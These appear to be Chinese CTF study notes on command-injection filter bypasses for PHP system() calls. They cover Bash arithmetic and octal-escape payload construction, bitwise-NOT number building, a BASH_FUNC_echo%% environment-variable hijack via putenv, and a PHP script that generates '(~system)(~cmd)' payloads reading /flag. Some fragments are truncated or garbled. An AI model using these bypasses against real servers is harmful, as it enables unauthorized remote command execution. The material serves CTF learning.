通配符

* //（星号）: 匹配零个或多个字符。例子: *.txt。  
? //（问号）: 匹配单个字符。例子: file?.txt。  
[] //（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。  
[^] //（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。  
{} //（大括号）: 匹配大括号内的任意一个字符串。例子: file{1,2,3}.txt。

Shell 兼容性问题

PHP 的 system() 函数默认调用的是系统的 /bin/sh

  • 在 Ubuntu/Debian 等系统中，/bin/sh 指向的是 Dash。
  • Dash 不支持 {cmd,arg} 这种花括号扩展语法。这种语法是 Bash 特有的扩展功能。如果后端环境是 Dash，输入 {cat,/fl''ag} 会被当成一个整体的字符串，导致系统报错 sh: 1: {cat,/flag}: not found。

linux相关知识

1. 标准流的基本概念

在 Linux 中，一切皆文件。一个命令执行时，默认会打开三个“通道”：

名称 简写 文件描述符 (FD) 默认位置 作用
Standard Input stdin 0 键盘 命令读取数据的地方
Standard Output stdout 1 屏幕 命令正常运行结果显示的地方
Standard Error stderr 2 屏幕 命令报错信息显示的地方

2. /dev/null：系统的“黑洞”

/dev/null 是一个特殊的设备文件。

  • 写入它：就像把垃圾扔进焚化炉，数据直接消失，不会占用空间。
  • 读取它：立刻返回一个 EOF（文件结束符），什么也读不到。
    在 RCE 题目中的表现： 如果后端代码写成 system($cmd . " > /dev/null");，那么无论你输入什么命令（比如 ls 或 cat /flag），结果都会被扔进黑洞，你的网页上什么回显都没有。

3. 关键语法详解

$ command > /dev/null

这是输出重定向。

  • > 符号默认重定向的是 stdout (1)。
  • 这行代码的意思是：把命令的正常运行结果扔进黑洞，不显示在屏幕上。
$ command > /dev/null 2>&1

这是最常用的“彻底静默”写法，分为两步解析：

  1. > /dev/null：把标准输出（1）定向到黑洞。

  2. 2>&1

    ：把标准错误（2）定向到标准输出（1）所在的地方。

    • 此时标准输出已经在黑洞里了，所以错误信息也会跟着进入黑洞。
      结果： 无论命令执行成功还是报错，屏幕上都干干净净。

二进制整数替换

在 bash 终端中, 支持使用 $((2#binary))来通过二进制表示十进制数

过滤样式

preg_match("/[A-Za-z2-9\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)

详细分析

  • 在 bash 中 $((...)) 是 算术扩展（Arithmetic Expansion） 的语法
echo $((3 + 5))   # 输出 8
echo $((10 / 2))  # 输出 5

a=10
b=5
echo $((a + b))  # 输出 15
  • 而 2#binary 是 进制表示法(Base Notation), 表示把后面的二进制串, 转化为十进制
echo $((8#72))  # 输出 58
echo $((16#1A))  # 输出 26
echo $((36#Z))  # 输出 35

操作

用 1 和 < 通过左移运算得到 2
此时$((2#binary))只差二进制串，这里用八进制转义

ls 转为八进制 -> \154\163
使用八进制转义 -> $'\154\163'
使用二进制替换 154 和 163, 这两个数现在当做十进制
	154 -> $((2#10011010)) -> $(($((1<<1))#10011010))
	163 -> $((2#10100011)) -> $(($((1<<1))#10100011))
于是 $'\154\163' -> $'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'

使用 

$'\$(($((1<<1))#10011010))\$(($((1<<1))#10100011))'

3. Shell Parameter Expansion(参数和变量扩展) 
   //$'...'
   //利用${IFS}绕过空格，或者利用${PATH:0:1}获取斜杠/。
4. Arithmetic Expansion(算术扩展)

5. Command Substitution(命令替换)
   //` ` 或$( )
   //echo $(whoami) = echo root
   //注意：它和变量扩展在同一优先级级别。
6. Process Substitution(进程替换)
   //<( )或>( )
   //将一个命令的输出看作一个临时文件。
   //例子：diff <(ls dir1) <(ls dir2)
7. Word Splitting(单词分割)
   //Bash 会查看结果中是否有$IFS（默认是空格、制表符、换行符）。如果有，它会将字符串拆分成多个参数

注意：

//进程替换->( )
//例子: 
ls / > >(grep flag)
  • 启动进程：Bash 启动了 grep flag 进程。
  • 创建管道：Bash 分配了一个文件描述符（FD），将其连接到 grep 的标准输入 (stdin)。
  • 伪装文件：对于左边的 ls / 来说，它看到的重定向目标不是一个进程，而是一个名为 /dev/fd/XX 的文件。
  • 数据传输：ls / 将扫描结果写入这个“文件”。实际上，这些数据通过内核管道，直接流进了 grep 的嘴里。
    简单的场景下，和 | 效果一样。但在多输出场景下，>( ) 是无可替代的神技
    使用 tee 配合进程替换： ls / | tee >(grep flag) >(wc -l) > output.txt
  • tee 命令会把数据“复制”成多份。
  • 第一份喂给 grep。
  • 第二份喂给 wc。
  • 第三份写入 output.txt

这个payload还是有问题，虽然解析后确实是cat /flag，但是Bash 只会对变量扩展的结果进行单词分割。而对于通过复杂转义或某些特定嵌套扩展生成的字符串Bash 有时会跳过。

Bash 认为这整串 cat /flag 就是一个命令的名字。它会去系统里找一个叫 cat /flag 的可执行文件，而不是找 cat 程序并传给它 /flag 参数。

报错 cat /flag: No such file or directory 其实非常有意思

  • 如果 cat 成功运行但没找到文件，报错应该是 cat: /flag: No such file...（注意那个冒号的位置）。
  • 如果报错是 cat /flag: No such...，说明系统在找一个名字包含空格的程序，而这个程序显然不存在。
    Bash 很固执，它在同一轮解析中生成的空格，它自己往往不认账。通过 <<< 把结果喂给一个新的 Bash 进程，强制它“重读一遍”，空格才能生效。所以需要把上文的 Payload 在加一层 Here String语法

取反

过滤样式

preg_match("/[A-Za-z0-9\"%*+,-.\/:;>?@[\]^`|]/", $cmd)

剩下&，，_，数字字母都过滤了，这里用$(()) 和 `(取反操作)` 进行构造数字
它的底层原理是计算机组成原理中的 补码 运算
在 Bash 的算术运算中，所有整数都是有符号整数

1. 核心数学公式：取反与相反数

在补码系统中，按位取反运算符 ~ 遵循以下公式：
\text{}x = -(x + 1)或者写成：
-x = \text{}x + 1

2. 逐步拆解构造过

我们将步骤拆解，看 Bash 是如何从“空”变出数字的：

第一步：生成 0
  • 表达式：$(())
  • 原理：空的算术扩展默认值为 0。
  • 结果：0
第二步：生成 -1 (关键转折点)
  • 表达式：$((~$(())))
  • 计算：按照公式 \text{~}x = -(x + 1)，这里 x=0。
  • 过程：\text{~}0 = -(0 + 1) = -1。
  • 二进制视角（以4位为例）：0000 取反变为 1111，在补码中这就是 -1。
  • 结果：-1
第三步：生成 -2 (累加)
  • 表达式：$(($((~$(())))$((~$(())))))
  • 计算：其实就是 $((-1-1))。
  • 过程：在 Bash 中，把两个表示 -1 的表达式放在一起，中间如果不加运算符，在某些构造中是通过字符串拼接再运算，或者直接进行算术求和。
  • 结果：-2
第四步：从 -2 变回 1 (取反还原)

这是你给出的最复杂的一步：$((~$(($((~$(())))$((~$(())))))))

  • 内部值：我们已知内部括号算出来是 -2。

  • 外部计算：等价于 $((~(-2)))。

  • 过程：应用公式 \text{~}x = -(x + 1)，此时 x = -2。

  • \text{~}(-2) = -(-2 + 1) = -(-1) = 1

  • 二进制视角

    ：

    1. -2 的补码是 1110。
    2. 执行 ~（按位取反）：1110 变为 0001。
    3. 0001 在十进制中正是 1。

  • 结果：1

oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造

  5. >-t\：创建带参数的碎片。

payload:

?envs[BASH_FUNC_echo%%]=() { cat /flag; }

1. 核心原理：Bash 函数导

在 Linux 的 Bash Shell 中，你可以定义一个函数并将其“导出”给子进程。Bash 存储导出的函数的方式，就是通过环境变量。
当你设置一个如下格式的环境变量时： BASH_FUNC_函数名%% = () { 具体的命令; }
Bash 在启动子进程（比如执行 system() 调用 /bin/sh）时，会自动解析这个环境变量，并将其转换为子进程内部的一个函数定义。

2. Payload 拆解

Payload：?envs[BASH_FUNC_echo%%]=() { cat /flag; }

  1. envs[...]: 对应 PHP 里的 $_REQUEST['envs']。
  2. key 为 BASH_FUNC_echo%%: 这是一个特殊的 key。在较新版本的 Bash 中，导出的函数名会加上 BASH_FUNC_ 前缀和 %% 后缀来防止意外覆盖。
  3. val 为 () { cat /flag; }: 这是一个 Bash 函数定义的固定格式。
  4. putenv 执行后: PHP 进程的环境变量中就多了一条：BASH_FUNC_echo%%=() { cat /flag; }

3. 执行 echo hello 会变成 cat /flag

  1. 触发子进程: PHP 执行 system('echo hello')。

  2. 调用 Shell: system 函数在底层会调用 /bin/sh -c "echo hello"。在很多 Linux 系统中，/bin/sh 实际上是指向 /bin/bash 的软链接。

  3. 加载函数: Bash 启动时，扫描环境变量，发现了 BASH_FUNC_echo%%。它会认为：“哦，父进程传给我一个叫 echo 的函数”，于是它在内部定义了 echo()。

  4. 函数劫持（关键点）

    :

    • 在 Bash 中，自定义函数的优先级高于内置命令和系统可执行文件。
    • 当 Shell 准备执行 echo hello 时，它发现已经有一个名字叫 echo 的函数了。
    • 于是它不再去调用系统真正的 /bin/echo，而是执行了你的函数体：{ cat /flag; }。

4. 前置条件

这个漏洞通常需要满足以下条件：

  • 操作系统环境：目标服务器的 /bin/sh 实际上是 Bash。
  • Bash 版本：虽然原始的 Shellshock 漏洞已被修复，但在某些环境下，Bash 对函数导出的解析逻辑依然允许这种“函数名覆盖”。
  • PHP 行为：system() 函数必须触发一个受环境变量影响的 Shell。
Bash 4.4以前：env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
Bash 4.4及以上：env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'

//取反脚本
<?php
function negateRce($system, $command) {
    $encoded_system = '';
    $encoded_command = '';
    
    // 对函数名取反并编码
    for ($i = 0; $i < strlen($system); $i++) {
        $not_char = ~$system[$i];
        $encoded_system .= '%' . bin2hex($not_char);
    }
    
    // 对命令取反并编码
    for ($i = 0; $i < strlen($command); $i++) {
        $not_char = ~$command[$i];
        $encoded_command .= '%' . bin2hex($not_char);
    }
    
    // 输出 payload
    echo '[*] (~' . $encoded_system . ')(~' . $encoded_command . ');' . PHP_EOL;
}

// 示例：生成 system('whoami') 的 payload
negateRce('system', 'cat /flag');
